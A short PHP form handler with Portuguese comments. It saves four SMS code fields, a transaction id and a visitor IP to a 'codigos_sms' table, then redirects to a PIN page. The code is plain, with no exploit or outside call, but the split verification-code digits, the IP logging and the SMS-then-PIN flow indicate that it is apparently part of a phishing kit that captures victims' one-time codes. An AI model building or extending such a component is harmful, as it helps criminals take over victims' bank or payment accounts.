<?php
session_start();
include "config.php";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verifica se os campos do formulário estão definidos
    if (isset($_POST["codigo3"]) && isset($_POST["codigo4"]) && isset($_POST["codigo5"]) && isset($_POST["codigo6"]) && isset($_POST["id"]) && isset($_POST["ip"])) {
        // Obtém os dados do formulário
        $codigo3 = $_POST["codigo3"];
        $codigo4 = $_POST["codigo4"];
        $codigo5 = $_POST["codigo5"];
        $codigo6 = $_POST["codigo6"];
        $id_transacao = $_POST["id"];
        $ip = $_POST["ip"];

        try {
            // Prepara a query de inserção
            $sql = "INSERT INTO codigos_sms (codigo3, codigo4, codigo5, codigo6, id_transacao, ip) VALUES (?, ?, ?, ?, ?, ?)";
            $stmt = $pdo->prepare($sql);
            // Executa a query
            $stmt->execute([$codigo3, $codigo4, $codigo5, $codigo6, $id_transacao, $ip]);

            // Redireciona para a próxima página após a inserção bem-sucedida
            $_SESSION['success_message'] = "Códigos salvos com sucesso!";
            header("Location: pin.php");
            exit();
        } catch (PDOException $e) {
            // Em caso de erro na execução da query
            $_SESSION['error_message'] = "Erro ao salvar os códigos. Por favor, tente novamente.";
            header("Location: sms.php");
            exit();
        }
    } else {
        // Se os campos do formulário não estiverem definidos
        $_SESSION['error_message'] = "Por favor, preencha todos os campos do formulário.";
        header("Location: sms.php");
        exit();
    }
}
?>
